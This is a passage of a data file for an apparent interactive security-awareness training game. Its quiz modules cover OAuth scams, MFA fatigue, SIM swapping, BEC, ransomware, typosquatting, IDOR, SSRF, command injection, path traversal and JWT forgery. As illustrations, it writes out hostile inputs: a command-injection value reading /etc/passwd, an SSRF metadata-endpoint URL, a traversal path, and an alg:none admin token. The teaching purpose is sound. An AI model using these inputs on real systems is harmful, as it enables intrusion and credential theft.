                </code>
                <p class="text-slate-500">By calling this script via URL, the attacker gains Remote Code Execution (RCE) on the web server.</p>
              </div>
            </div>
          </div>
        `,
        choices: [
          {
            label: "Rename uploads, disable executable execution on upload directory, and verify mime-types on server",
            correct: true,
            feedback: "Perfect! Preventing files inside `/uploads` from executing as scripts, combined with checking files using server-side library verification, eliminates RCE vectors.",
            xpReward: 200
          },
          {
            label: "Use client-side JavaScript to check the file extension string before uploading",
            correct: false,
            feedback: "Wrong. Client-side checks are easily bypassed by intercepting the HTTP request using proxies like Burp Suite or constructing custom multi-part requests."
          },
          {
            label: "Enforce a maximum file size limits of 200KB",
            correct: false,
            feedback: "Incorrect. Web shell script payloads are extremely tiny (under 1KB), so size limitations will not prevent malicious uploads."
          }
        ]
      }
    ]
  },
  {
    id: 19,
    title: "OAuth Permission Scam",
    difficulty: "Intermediate",
    time: "3 mins",
    xp: 140,
    icon: "fingerprint",
    goal: "Spot rogue third-party OAuth app authorization requests seeking high privilege access.",
    summary: "Rogue applications use 'Log in with Google/Microsoft' interfaces but request extensive scopes, like reading or deleting emails. Review the requested permissions carefully before authorizing.",
    tips: [
      "Verify the developer name and privacy policy on OAuth screens.",
      "Check requested scopes: a simple game should not require email access.",
      "Periodically revoke unused third-party application permissions in your account settings."
    ],
    steps: [
      {
        id: 1,
        title: "OAuth Authorization Request",
        description: "An online puzzle game asks you to sign in using Google. Review the permissions list.",
        leftWindowHtml: `
          <div class="p-4 bg-slate-900 h-full rounded flex flex-col font-sans text-slate-200">
            <div class="bg-white text-slate-800 p-4 rounded-lg flex-1 flex flex-col justify-center space-y-4">
              <div class="flex justify-between items-center border-b pb-2">
                <span class="text-sm font-bold text-slate-700">Sign in with Google</span>
                <span class="text-xs text-slate-400">OAuth 2.0</span>
              </div>
              
              <div class="space-y-1">
                <h4 class="text-xs font-semibold text-slate-700">PuzzleMania Online requests access to:</h4>
                <div class="p-3 bg-red-50 rounded border border-red-200 text-xs space-y-2 text-slate-700">
                  <div class="flex items-center space-x-2 text-red-600 font-bold">
                    <span>⚠️</span>
                    <span>High Privilege Permissions</span>
                  </div>
                  <ul class="list-disc pl-4 text-[10px] space-y-1 text-slate-650">
                    <li>Read, compose, and permanently delete all your Gmail emails</li>
                    <li>Access your complete Google Drive folder files</li>
                  </ul>
                </div>
              </div>

              <div class="flex justify-end space-x-2 text-xs pt-2">
                <button id="btn-oauth-deny" class="border border-slate-300 px-4 py-2 rounded text-slate-600 font-semibold">Deny</button>
                <button id="btn-oauth-allow" class="bg-blue-600 text-white px-4 py-2 rounded font-semibold">Allow Access</button>
              </div>
            </div>
          </div>
        `,
        rightWindowHtml: `
          <div class="p-4 h-full flex flex-col justify-between font-mono text-xs">
            <div class="space-y-4">
              <div class="text-cyan-400 border-b border-cyan-900/50 pb-2">OAUTH PRIVILEGE AUDIT</div>
              
              <div class="bg-slate-950 p-3 rounded border border-slate-850 text-[10px] space-y-2">
                <div class="text-slate-300">Requested Scopes:</div>
                <ul class="list-disc pl-4 text-slate-400 space-y-1 text-[9px]">
                  <li><code class="text-red-400">https://www.googleapis.com/auth/gmail.modify</code></li>
                  <li><code class="text-red-400">https://www.googleapis.com/auth/drive</code></li>
                </ul>
                <p class="text-slate-500">
                  Once clicked 'Allow', the developer server gets an Access Token that allows them to download your entire correspondence database.
                </p>
              </div>
            </div>
          </div>
        `,
        choices: [
          {
            label: "Click Allow Access to proceed playing the puzzle game",
            correct: false,
            feedback: "Wrong! Puzzle games do not require read/write access to your emails or Google Drive files. Granting this lets scammers harvest your private records."
          },
          {
            label: "Click Deny, cancel authorization, and look for alternative logins",
            correct: true,
            feedback: "Correct! Spotting excessive scopes and denying access protects your cloud files. Legitimate services request minimal scopes.",
            xpReward: 140
          },
          {
            label: "Allow Access but modify your password immediately after",
            correct: false,
            feedback: "Incorrect. Changing your account password does not automatically revoke the OAuth Access Token that was already granted to the third-party application."
          }
        ]
      }
    ]
  },
  {
    id: 20,
    title: "Website Security Challenge",
    difficulty: "Advanced",
    time: "5 mins",
    xp: 250,
    icon: "shield",
    goal: "Conduct a comprehensive security review and configure server defenses.",
    summary: "As a security administrator, you must ensure that cross-site scripting (XSS), request forgery (CSRF), clickjacking, and connection sniffing are defended at the root architecture layer.",
    tips: [
      "Combine SSL, anti-CSRF, and HttpOnly cookie flags for defense-in-depth.",
      "Audit policies periodically using security scanners."
    ],
    steps: [
      {
        id: 1,
        title: "Server Configuration Audit",
        description: "Choose the configuration set that implements secure parameters for all security channels.",
        leftWindowHtml: `
          <div class="p-4 bg-slate-900 h-full rounded flex flex-col font-sans text-slate-200">
            <div class="bg-slate-950 p-3 rounded-lg border border-slate-800 space-y-3 flex-1 overflow-y-auto">
              <div class="text-xs font-bold text-cyan-400">// Server Defense Settings</div>
              
              <div class="space-y-2 text-[11px]">
                <div class="flex justify-between border-b border-slate-850 pb-1">
                  <span>SSL Connection</span>
                  <span class="text-emerald-400 font-bold" id="cfg-ssl">ENABLED (HTTPS)</span>
                </div>
                <div class="flex justify-between border-b border-slate-850 pb-1">
                  <span>Session Cookie Flags</span>
                  <span class="text-red-400 font-bold" id="cfg-cookies">None</span>
                </div>
                <div class="flex justify-between border-b border-slate-850 pb-1">
                  <span>X-Frame-Options</span>
                  <span class="text-red-400 font-bold" id="cfg-frame">DISABLED</span>
                </div>
                <div class="flex justify-between border-b border-slate-850 pb-1">
                  <span>Content Security Policy</span>
                  <span class="text-red-400 font-bold" id="cfg-csp">UNCONFIGURED</span>
                </div>
              </div>
            </div>
          </div>
        `,
        rightWindowHtml: `
          <div class="p-4 h-full flex flex-col justify-between font-mono text-xs">
            <div class="space-y-4">
              <div class="text-cyan-400 border-b border-cyan-900/50 pb-2">VULNERABILITY INDEX</div>
              
              <div class="bg-slate-950 p-4 rounded border border-slate-850 text-center">
                <div class="text-red-400 text-3xl font-bold animate-pulse" id="val-vuln-index">92%</div>
                <div class="text-[10px] text-slate-500 mt-1">High Exposure Risk</div>
              </div>
            </div>
          </div>
        `,
        choices: [
          {
            label: "Set: Cookies=Secure;HttpOnly, X-Frame-Options=DENY, CSP=strict-src",
            correct: true,
            feedback: "Excellent! This setup enforces encrypted storage, denies embedding via iframes (clickjacking defense), and restricts script sources (XSS defense).",
            xpReward: 250
          },
          {
            label: "Disable Content Security Policy to increase page render speed",
            correct: false,
            feedback: "Wrong. Disabling CSP exposes the browser directly to XSS script injection, causing serious credential leakage risks."
          },
          {
            label: "Enable SSL and leave other options default to maintain compatibility",
            correct: false,
            feedback: "Incorrect. SSL only encrypts data in transit. If session cookies are insecure or X-Frame is disabled, attackers can still steal tokens or clickjack users."
          }
        ]
      }
    ]
  }
,
  {
    id: 21,
    title: "MFA Fatigue Attack (Push Prompt Spam)",
    difficulty: "Beginner",
    time: "3 mins",
    xp: 140,
    icon: "smartphone",
    goal: "Understand MFA fatigue attacks where hackers spam push notifications until the victim accepts.",
    summary: "Attackers who obtain compromised passwords send dozens of MFA push prompts during late hours hoping the target gets frustrated or accidentally taps 'Approve'. Never approve unexpected push requests.",
    tips: [
      "Never approve MFA prompts you did not initiate.",
      "Use Number Matching MFA where you must type a code displayed on screen.",
      "Report repeated unauthorized MFA prompts to IT security."
    ],
    steps: [
      {
        id: 1,
        title: "Repeated Push Notifications",
        description: "Your phone receives multiple MFA push requests at 3:00 AM. Inspect your security options.",
        leftWindowHtml: `
          <div class="p-4 bg-slate-900 h-full rounded flex flex-col font-sans text-slate-200 justify-center items-center">
            <div class="w-64 bg-slate-950 border border-slate-700 rounded-2xl p-4 shadow-2xl space-y-4">
              <div class="flex justify-between items-center text-[10px] text-slate-400">
                <span>Authenticator App</span>
                <span>03:14 AM</span>
              </div>
              <div class="text-center space-y-1">
                <div class="text-sm font-bold text-white">Sign-in Request</div>
                <div class="text-xs text-slate-400">Location: Frankfurt, Germany</div>
                <div class="text-[10px] text-amber-400 animate-pulse">Request #14 (Repeated prompt)</div>
              </div>
              <div class="flex space-x-2 pt-2">
                <button class="flex-1 bg-red-600 hover:bg-red-500 py-2 rounded text-xs font-bold text-white">Deny</button>
                <button class="flex-1 bg-emerald-600 hover:bg-emerald-500 py-2 rounded text-xs font-bold text-white">Approve</button>
              </div>
            </div>
          </div>
        `,
        rightWindowHtml: `
          <div class="p-4 h-full flex flex-col justify-between font-mono text-xs">
            <div class="space-y-4">
              <div class="text-cyan-400 border-b border-cyan-900/50 pb-2">ATTACK FLOW: MFA SPAM</div>
              <div class="bg-slate-950 p-3 rounded border border-slate-850 text-[10px] space-y-2">
                <div class="text-amber-400 font-bold">Strategy: Exhaustion</div>
                <p class="text-slate-400">Attacker has password, sending continuous authentication prompts until victim clicks Approve out of annoyance.</p>
              </div>
            </div>
          </div>
        `,
        choices: [
          {
            label: "Click Approve to stop the notifications from buzzing",
            correct: false,
            feedback: "Wrong! Approving the MFA prompt lets the attacker log in to your account instantly."
          },
          {
            label: "Click Deny, report the incident to security, and change your password immediately",
            correct: true,
            feedback: "Excellent! Denying the request blocks entry, and changing your password stops further prompts.",
            xpReward: 140
          },
          {
            label: "Ignore the phone and go back to sleep without reporting",
            correct: false,
            feedback: "Incorrect. The attacker will continue sending requests or try other escalation routes. Reporting allows IT to lock compromised credentials."
          }
        ]
      }
    ]
  },
  {
    id: 22,
    title: "SIM Swapping & SMS Interception",
    difficulty: "Intermediate",
    time: "4 mins",
    xp: 180,
    icon: "smartphone",
    goal: "Learn how hackers hijack mobile phone numbers to bypass SMS-based two-factor authentication.",
    summary: "Attackers impersonate victims to trick mobile carriers into transferring the victim's phone number to a new SIM card. SMS is not a secure 2FA channel for high-security accounts.",
    tips: [
      "Use App-based authenticators (TOTP) or Hardware keys instead of SMS 2FA.",
      "Add a verbal PIN / passphrase to your mobile carrier account.",
      "Act immediately if your mobile signal drops completely without reason."
    ],
    steps: [
      {
        id: 1,
        title: "Sudden Loss of Signal",
        description: "Your phone suddenly shows 'No Service', and an email alert mentions a SIM transfer request.",
        leftWindowHtml: `
          <div class="p-4 bg-slate-900 h-full rounded flex flex-col font-sans text-slate-200 justify-between">
            <div class="bg-slate-950 p-3 rounded border border-slate-800 text-xs">
              <div class="flex items-center justify-between text-red-400 font-bold">
                <span>Signal Status: NO SERVICE</span>
                <span class="animate-ping">⚠️</span>
              </div>
              <p class="text-[11px] text-slate-400 mt-1">Carrier SIM card deactivated by carrier remote request.</p>
            </div>
            <div class="bg-slate-850 p-3 rounded border border-slate-700 text-xs space-y-2">
              <div class="text-cyan-400 font-bold">Bank Security Alert:</div>
              <p class="text-[11px] text-slate-300">"An SMS password reset code was dispatched to your phone number."</p>
            </div>
          </div>
        `,
        rightWindowHtml: `
          <div class="p-4 h-full flex flex-col justify-between font-mono text-xs">
            <div class="space-y-4">
              <div class="text-cyan-400 border-b border-cyan-900/50 pb-2">SIM SWAP MECHANISM</div>
              <div class="bg-slate-950 p-3 rounded border border-slate-850 text-[10px] space-y-2">
                <div class="text-red-400 font-bold">Telecom Spoofing</div>
                <p class="text-slate-400">Scammer tricked carrier support into routing +1-555-0199 to attacker's SIM.</p>
              </div>
            </div>
          </div>
        `,
        choices: [
          {
            label: "Wait a few hours to see if cell tower signal recovers",
            correct: false,
            feedback: "Wrong! Every minute counts. The attacker is currently resetting your financial and social accounts via SMS."
          },
          {
            label: "Immediately contact your telecom operator and switch authentication to an App/Key",
            correct: true,
            feedback: "Correct! Contacting the carrier halts the fraudulent transfer, and switching away from SMS 2FA protects your accounts.",
            xpReward: 180
          },
          {
            label: "Restart your phone continuously",
            correct: false,
            feedback: "Incorrect. Signal loss due to SIM swapping occurs at the network level, not on the local device hardware."
          }
        ]
      }
    ]
  },
  {
    id: 23,
    title: "Business Email Compromise (BEC)",
    difficulty: "Intermediate",
    time: "4 mins",
    xp: 190,
    icon: "mail",
    goal: "Detect wire transfer fraud and CEO fraud impersonation emails targeting finance teams.",
    summary: "BEC attacks use compromised corporate accounts or spoofed executive emails to trick employees into transferring funds to fraudulent vendor accounts.",
    tips: [
      "Always verify bank details changes via secondary out-of-band communication (phone call to known number).",
      "Look for urgency and requests to bypass standard approval channels.",
      "Implement dual-custody authorization for external wire transfers."
    ],
    steps: [
      {
        id: 1,
        title: "Urgent Wire Transfer Request",
        description: "You work in accounting and receive an urgent email from your CEO asking for an immediate wire payment.",
        leftWindowHtml: `
          <div class="p-4 bg-slate-900 h-full rounded flex flex-col font-sans text-slate-200">
            <div class="bg-slate-950 p-3 rounded border border-slate-800 text-xs space-y-2">
              <div class="text-slate-400">From: CEO John Smith &lt;ceo@company-execs-global.com&gt;</div>
              <div class="text-red-400 font-bold">Subject: URGENT: Acquisition Payment Needed Confidential</div>
              <p class="text-[11px] text-slate-300">"I am in a confidential meeting. Wire $45,000 to this new vendor immediately. Do not discuss with anyone."</p>
            </div>
          </div>
        `,
        rightWindowHtml: `
          <div class="p-4 h-full flex flex-col justify-between font-mono text-xs">
            <div class="space-y-4">
              <div class="text-cyan-400 border-b border-cyan-900/50 pb-2">BEC INDICATORS</div>
              <div class="bg-slate-950 p-3 rounded border border-slate-850 text-[10px] space-y-2">
                <div class="text-amber-400 font-bold">Red Flags:</div>
                <p class="text-slate-400">• Lookalike domain (company-execs-global.com)</p>
                <p class="text-slate-400">• Request to bypass verification procedures</p>
              </div>
            </div>
          </div>
        `,
        choices: [
          {
            label: "Execute the wire transfer immediately as requested by the CEO",
            correct: false,
            feedback: "Wrong! This is executive impersonation (BEC). The money will go to an attacker's offshore bank account."
          },
          {
            label: "Verify the request out-of-band by calling the CEO on their verified phone number",
            correct: true,
            feedback: "Perfect! Out-of-band verification via a known corporate phone number stops financial fraud.",
            xpReward: 190
          },
          {
            label: "Reply to the email asking for additional invoice attachments",
            correct: false,
            feedback: "Incorrect. Replying to a spoofed email only communicates with the fraudster, who will provide fake invoices."
          }
        ]
      }
    ]
  },
  {
    id: 24,
    title: "Ransomware Defense & Backup Strategy",
    difficulty: "Advanced",
    time: "5 mins",
    xp: 220,
    icon: "database-zap",
    goal: "Learn how ransomware encrypts files and how immutable backups protect organizations.",
    summary: "Ransomware encrypts critical files and demands payment for decryption keys. Having offline/immutable backups (3-2-1 rule) ensures business continuity without paying ransoms.",
    tips: [
      "Follow the 3-2-1 backup rule (3 copies, 2 different media, 1 offsite/immutable).",
      "Regularly test backup restoration procedures.",
      "Never pay the ransom; it funds crime and does not guarantee data recovery."
    ],
    steps: [
      {
        id: 1,
        title: "Encrypted Files Detected",
        description: "Your team discovers files renamed to '.locked' across shared drives.",
        leftWindowHtml: `
          <div class="p-4 bg-slate-900 h-full rounded flex flex-col font-sans text-slate-200">
            <div class="bg-red-950/40 p-4 rounded border border-red-800 text-center space-y-2">
              <div class="text-red-400 text-xl font-bold font-mono">YOUR FILES ARE ENCRYPTED</div>
              <p class="text-xs text-slate-300">All data has been locked with RSA-4096. Pay 5 BTC to retrieve key.</p>
            </div>
          </div>
        `,
        rightWindowHtml: `
          <div class="p-4 h-full flex flex-col justify-between font-mono text-xs">
            <div class="space-y-4">
              <div class="text-cyan-400 border-b border-cyan-900/50 pb-2">BACKUP AUDIT</div>
              <div class="bg-slate-950 p-3 rounded border border-slate-850 text-[10px] space-y-1">
                <div class="text-emerald-400 font-bold">Immutable Cold Storage: AVAILABLE</div>
                <p class="text-slate-400">Offline snapshot from 02:00 AM is clean and uncorrupted.</p>
              </div>
            </div>
          </div>
        `,
        choices: [
          {
            label: "Pay the Bitcoin ransom to get the decryption key",
            correct: false,
            feedback: "Wrong! Paying ransoms fuels cybercrime networks and often fails to recover data."
          },
          {
            label: "Isolate infected systems and restore data from verified immutable offline backups",
            correct: true,
            feedback: "Excellent! Isolating machines stops lateral spread, and immutable backups allow full recovery.",
            xpReward: 220
          },
          {
            label: "Delete the encrypted files without checking backup availability",
            correct: false,
            feedback: "Incorrect. Deleting files before verifying backup integrity can lead to permanent data loss."
          }
        ]
      }
    ]
  },
  {
    id: 25,
    title: "Supply Chain Dependency Poisoning",
    difficulty: "Intermediate",
    time: "4 mins",
    xp: 170,
    icon: "box",
    goal: "Recognize malicious open-source packages (typosquatting on npm/PyPI).",
    summary: "Attackers publish malicious packages with names visually similar to popular open-source libraries (e.g. `reqeusts` vs `requests`). Always verify library names and checksums.",
    tips: [
      "Double-check package name spelling before running `npm install` or `pip install`.",
      "Use lockfiles (`package-lock.json`) and audit tools (`npm audit`).",
      "Pin exact dependency versions."
    ],
    steps: [
      {
        id: 1,
        title: "Installing Third-Party Libraries",
        description: "A tutorial suggests running a terminal command to install a utility package.",
        leftWindowHtml: `
          <div class="p-4 bg-slate-900 h-full rounded flex flex-col font-sans text-slate-200">
            <div class="bg-slate-950 p-3 rounded border border-slate-800 font-mono text-xs space-y-2">
              <div class="text-cyan-400">$ npm install reqeusts-secure-v2</div>
              <div class="text-amber-400 text-[10px]">Notice: Downloads count: 12 (Created 1 hour ago)</div>
            </div>
          </div>
        `,
        rightWindowHtml: `
          <div class="p-4 h-full flex flex-col justify-between font-mono text-xs">
            <div class="space-y-4">
              <div class="text-cyan-400 border-b border-cyan-900/50 pb-2">PACKAGE AUDIT</div>
              <div class="bg-slate-950 p-3 rounded border border-slate-850 text-[10px] space-y-1">
                <div class="text-red-400 font-bold">Typosquatting Risk</div>
                <p class="text-slate-400">Package contains postinstall script that exfiltrates environment variables.</p>
              </div>
            </div>
          </div>
        `,
        choices: [
          {
            label: "Run the command to install the package quickly",
            correct: false,
            feedback: "Wrong! 'reqeusts' is a typosquatted package containing malicious lifecycle scripts."
          },
          {
            label: "Verify official package name on npmjs.com and check download metrics before installing",
            correct: true,
            feedback: "Correct! Checking official names and download counts prevents installing malicious supply chain packages.",
            xpReward: 170
          },
          {
            label: "Disable package lockfiles to speed up build time",
            correct: false,
            feedback: "Incorrect. Disabling lockfiles exposes builds to unexpected, unverified dependency versions."
          }
        ]
      }
    ]
  },
  {
    id: 26,
    title: "Insecure Direct Object Reference (IDOR)",
    difficulty: "Intermediate",
    time: "4 mins",
    xp: 200,
    icon: "file-text",
    goal: "Understand how changing parameter values in URLs can expose unauthorized user records.",
    summary: "IDOR occurs when an application uses user-supplied input to access objects directly without checking authorization rights.",
    tips: [
      "Enforce object-level access control checks on every API endpoint.",
      "Use unguessable unique identifiers (UUIDs) instead of sequential integer IDs.",
      "Never rely solely on client-side UI hiding."
    ],
    steps: [
      {
        id: 1,
        title: "Viewing Account Invoice",
        description: "You click to view your invoice at `/api/invoice?id=1042`. Notice the parameter.",
        leftWindowHtml: `
          <div class="p-4 bg-slate-900 h-full rounded flex flex-col font-sans text-slate-200">
            <div class="bg-slate-950 p-3 rounded border border-slate-800 text-xs font-mono">
              <span class="text-slate-400">GET</span> <span class="text-cyan-400">https://shop.com/api/invoices/1042</span>
            </div>
            <div class="bg-slate-850 p-3 rounded mt-3 text-xs space-y-1">
              <div>Invoice #1042 - User: John Doe (Your Account)</div>
              <div>Total: $49.99</div>
            </div>
          </div>
        `,
        rightWindowHtml: `
          <div class="p-4 h-full flex flex-col justify-between font-mono text-xs">
            <div class="space-y-4">
              <div class="text-cyan-400 border-b border-cyan-900/50 pb-2">AUTHORIZATION ENGINE</div>
              <div class="bg-slate-950 p-3 rounded border border-slate-850 text-[10px] space-y-1">
                <div class="text-amber-400 font-bold">Vulnerability:</div>
                <p class="text-slate-400">Server fetches SQL record where id=1042 without validating if current Session User matches Owner.</p>
              </div>
            </div>
          </div>
        `,
        choices: [
          {
            label: "Implement server-side authorization check: verify user session owns invoice ID",
            correct: true,
            feedback: "Perfect! Validating ownership on every backend API request stops IDOR vulnerabilities.",
            xpReward: 200
          },
          {
            label: "Hide the invoice URL from the browser DOM using CSS",
            correct: false,
            feedback: "Wrong! Hiding links in UI does not protect API endpoints from direct HTTP requests."
          },
          {
            label: "Base64 encode the ID parameter in the URL string",
            correct: false,
            feedback: "Incorrect. Base64 is encoding, not encryption or authorization. Anyone can decode and manipulate it."
          }
        ]
      }
    ]
  },
  {
    id: 27,
    title: "SSRF (Server-Side Request Forgery)",
    difficulty: "Advanced",
    time: "5 mins",
    xp: 230,
    icon: "globe",
    goal: "Learn how attackers force web servers to make requests to internal resources.",
    summary: "SSRF vulnerabilities let attackers trick a server into making HTTP requests to internal IP addresses (like 169.254.169.254 cloud metadata services) that are inaccessible from outside.",
    tips: [
      "Restrict outgoing HTTP requests using strict URL domain whitelists.",
      "Block access to internal IP ranges (127.0.0.1, 169.254.169.254, 10.0.0.0/8).",
      "Disable HTTP redirects on server-side HTTP clients."
    ],
    steps: [
      {
        id: 1,
        title: "Image Fetcher Feature",
        description: "A web app lets you input an image URL to preview: `https://app.com/preview?url=...`",
        leftWindowHtml: `
          <div class="p-4 bg-slate-900 h-full rounded flex flex-col font-sans text-slate-200">
            <div class="bg-slate-950 p-3 rounded border border-slate-800 text-xs font-mono space-y-2">
              <span class="text-cyan-400">Image Fetcher Input:</span>
              <input type="text" class="w-full bg-slate-900 border border-slate-700 p-2 rounded text-slate-300" value="http://169.254.169.254/latest/meta-data/" disabled>
            </div>
          </div>
        `,
        rightWindowHtml: `
          <div class="p-4 h-full flex flex-col justify-between font-mono text-xs">
            <div class="space-y-4">
              <div class="text-cyan-400 border-b border-cyan-900/50 pb-2">SSRF TARGET DATA</div>
              <div class="bg-slate-950 p-3 rounded border border-slate-850 text-[10px] space-y-1">
                <div class="text-red-400 font-bold">Cloud Credentials Leaked:</div>
                <code class="text-amber-400">AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI...</code>
              </div>
            </div>
          </div>
        `,
        choices: [
          {
            label: "Allow any URL input as long as it starts with http://",
            correct: false,
            feedback: "Wrong! This lets attackers query internal metadata endpoints and steal cloud credentials."
          },
          {
            label: "Sanitize URL input with strict domain whitelist and block internal IP ranges",
            correct: true,
            feedback: "Excellent! Whitelisting external domains and blocking private IPs eliminates SSRF risks.",
            xpReward: 230
          },
          {
            label: "Use client-side JavaScript to validate the image extension",
            correct: false,
            feedback: "Incorrect. Client-side checks can be bypassed, and the server will still execute the request."
          }
        ]
      }
    ]
  },
  {
    id: 28,
    title: "Command Injection Defense",
    difficulty: "Advanced",
    time: "5 mins",
    xp: 220,
    icon: "terminal",
    goal: "Understand how unsanitized OS shell execution allows command execution.",
    summary: "Command injection occurs when untrusted input is passed directly to system shell commands (e.g. exec('ping ' + ip)). Attackers append command separators (;&|) to run arbitrary commands.",
    tips: [
      "Avoid using system shell execution functions (`exec`, `system`).",
      "Use built-in language APIs instead of external shell tools.",
      "Apply strict input validation (regex for IP formats)."
    ],
    steps: [
      {
        id: 1,
        title: "Network Diagnostics Ping Tool",
        description: "A web utility ping tool accepts host IP inputs.",
        leftWindowHtml: `
          <div class="p-4 bg-slate-900 h-full rounded flex flex-col font-sans text-slate-200">
            <div class="bg-slate-950 p-3 rounded border border-slate-800 text-xs font-mono space-y-2">
              <span class="text-cyan-400">Ping Diagnostics Tool</span>
              <input type="text" class="w-full bg-slate-900 border border-slate-700 p-2 rounded text-slate-300" value="8.8.8.8; cat /etc/passwd" disabled>
            </div>
          </div>
        `,
        rightWindowHtml: `
          <div class="p-4 h-full flex flex-col justify-between font-mono text-xs">
            <div class="space-y-4">
              <div class="text-cyan-400 border-b border-cyan-900/50 pb-2">COMMAND EXECUTION</div>
              <div class="bg-slate-950 p-3 rounded border border-slate-850 text-[10px] space-y-1">
                <div class="text-red-400 font-bold">Injected Output:</div>
                <code class="text-slate-300">root:x:0:0:root:/root:/bin/bash...</code>
              </div>
            </div>
          </div>
        `,
        choices: [
          {
            label: "Replace shell execution with native socket APIs and validate IP format strictly",
            correct: true,
            feedback: "Perfect! Using built-in APIs eliminates system shell calls and prevents command execution.",
            xpReward: 220
          },
          {
            label: "Filter out semicolon ';' character only",
            correct: false,
            feedback: "Wrong! Attackers can use `&&`, `||`, `|`, or newline characters to chain shell commands."
          },
          {
            label: "Increase server CPU quota to absorb extra commands",
            correct: false,
            feedback: "Incorrect. CPU quotas don't stop attackers from reading sensitive system files."
          }
        ]
      }
    ]
  },
  {
    id: 29,
    title: "Path Traversal (Directory Traversal)",
    difficulty: "Intermediate",
    time: "4 mins",
    xp: 190,
    icon: "folder-tree",
    goal: "Learn how directory traversal patterns (`../`) expose restricted file system paths.",
    summary: "Directory traversal allows attackers to read arbitrary files on the server by supplying relative path sequences (e.g. `../../../../etc/passwd`).",
    tips: [
      "Sanitize file path parameters by removing `..` and `/` characters.",
      "Use canonicalized paths and verify they reside within the intended root directory.",
      "Avoid passing user input directly to file system read functions."
    ],
    steps: [
      {
        id: 1,
        title: "File Downloader Feature",
        description: "A website downloads documents using `/download?file=doc.pdf`.",
        leftWindowHtml: `
          <div class="p-4 bg-slate-900 h-full rounded flex flex-col font-sans text-slate-200">
            <div class="bg-slate-950 p-3 rounded border border-slate-800 text-xs font-mono">
              <span class="text-slate-400">GET</span> <span class="text-cyan-400">https://app.com/download?file=../../../../etc/passwd</span>
            </div>
          </div>
        `,
        rightWindowHtml: `
          <div class="p-4 h-full flex flex-col justify-between font-mono text-xs">
            <div class="space-y-4">
              <div class="text-cyan-400 border-b border-cyan-900/50 pb-2">FILE SYSTEM TRAVERSAL</div>
              <div class="bg-slate-950 p-3 rounded border border-slate-850 text-[10px] space-y-1">
                <div class="text-red-400 font-bold">System File Exposed</div>
                <p class="text-slate-400">Server resolved relative paths outside public static directory.</p>
              </div>
            </div>
          </div>
        `,
        choices: [
          {
            label: "Validate that resolved canonical path resides inside designated upload folder",
            correct: true,
            feedback: "Correct! Path canonicalization and directory restriction prevent accessing system files.",
            xpReward: 190
          },
          {
            label: "Remove space characters from the file parameter",
            correct: false,
            feedback: "Wrong! Path traversal does not require spaces; relative sequences use dots and slashes."
          },
          {
            label: "Hide file download buttons on the frontend page",
            correct: false,
            feedback: "Incorrect. Hiding UI components does not stop direct GET request manipulation."
          }
        ]
      }
    ]
  },
  {
    id: 30,
    title: "JWT Security & Token Forgery",
    difficulty: "Advanced",
    time: "5 mins",
    xp: 240,
    icon: "key-round",
    goal: "Analyze JWT algorithm flaws (`alg: none`) and weak signing secrets.",
    summary: "JSON Web Tokens (JWT) must be signed with strong cryptographic algorithms and secret keys. Misconfigurations like accepting `alg: none` allow signature forgery.",
    tips: [
      "Explicitly enforce approved signing algorithms (e.g. RS256 or HS256) on token verification.",
      "Never accept `alg: none` in JWT headers.",
      "Use strong, high-entropy secret keys for HMAC algorithms."
    ],
    steps: [
      {
        id: 1,
        title: "JWT Authentication Header",
        description: "An API parses authorization tokens: `Bearer eyJhbGciOiJub25lIn0...`",
        leftWindowHtml: `
          <div class="p-4 bg-slate-900 h-full rounded flex flex-col font-sans text-slate-200">
            <div class="bg-slate-950 p-3 rounded border border-slate-800 text-xs font-mono space-y-2">
              <div class="text-cyan-400">// JWT Header decoded</div>
              <div class="text-slate-300">{ "alg": "none", "typ": "JWT" }</div>
              <div class="text-cyan-400">// JWT Payload decoded</div>
              <div class="text-emerald-400">{ "user": "guest", "role": "admin" }</div>
            </div>
          </div>
        `,
        rightWindowHtml: `
          <div class="p-4 h-full flex flex-col justify-between font-mono text-xs">
            <div class="space-y-4">
              <div class="text-cyan-400 border-b border-cyan-900/50 pb-2">JWT VERIFICATION ENGINE</div>
              <div class="bg-slate-950 p-3 rounded border border-slate-850 text-[10px] space-y-1">
                <div class="text-red-400 font-bold">Signature Verification Bypassed!</div>
                <p class="text-slate-400">Server accepted 'alg: none' and granted admin privilege.</p>
              </div>
            </div>
          </div>
        `,
        choices: [
          {
            label: "Enforce strict algorithm whitelist (e.g. HS256) and reject 'none' algorithm",
            correct: true,
            feedback: "Perfect! Explicit algorithm enforcement prevents JWT header tampering and forgery.",
            xpReward: 240
          },
          {
            label: "Accept 'none' algorithm for internal debugging requests only",
            correct: false,
            feedback: "Wrong! Attackers can spoof headers to make public requests appear as internal debugging traffic."
          },
          {
            label: "Store JWT tokens in plain text cookies",
            correct: false,
            feedback: "Incorrect. Token storage format doesn't fix server-side signature verification flaws."
          }
        ]
      }
    ]
  },
  {
    id: 31,
    title: "API Rate Limiting & DoS Defense",
    difficulty: "Intermediate",
    time: "4 mins",
    xp: 160,
    icon: "zap",
    goal: "Learn how rate limiting prevents brute-force abuse and API resource exhaustion.",
    summary: "APIs without rate limiting are vulnerable to automated scraping, credential stuffing, and denial-of-service attacks. Implementing token bucket or leaky bucket algorithms protects infrastructure.",
    tips: [
      "Implement rate limiting per IP and per authenticated user.",
      "Return standard HTTP status `429 Too Many Requests` when limits are exceeded.",
      "Use web application firewalls (WAF) or API gateways to absorb surge traffic."
    ],
    steps: [
      {
        id: 1,
        title: "Automated API Stress Test",
        description: "An API endpoint experiences 500 requests per second from a single IP.",
        leftWindowHtml: `
          <div class="p-4 bg-slate-900 h-full rounded flex flex-col font-sans text-slate-200">
            <div class="bg-slate-950 p-3 rounded border border-slate-800 text-xs font-mono space-y-2">
              <div class="text-red-400">Incoming Requests: 500 req/sec</div>
              <div class="text-slate-400">Endpoint: POST /api/v1/auth/login</div>
            </div>
          </div>
        `,
        rightWindowHtml: `
          <div class="p-4 h-full flex flex-col justify-between font-mono text-xs">
            <div class="space-y-4">
              <div class="text-cyan-400 border-b border-cyan-900/50 pb-2">GATEWAY MONITOR</div>
              <div class="bg-slate-950 p-3 rounded border border-slate-850 text-[10px] space-y-1">
                <div class="text-amber-400 font-bold">CPU Usage: 98%</div>
                <p class="text-slate-400">Unthrottled requests exhausting database pool connections.</p>
              </div>
            </div>
          </div>
        `,
        choices: [
          {
            label: "Configure rate limiting middleware (e.g. 10 requests per minute per IP)",
            correct: true,
            feedback: "Correct! Rate limiting mitigates automated attacks and protects server availability.",
            xpReward: 160
          },
          {
            label: "Increase server database memory without request throttling",
            correct: false,
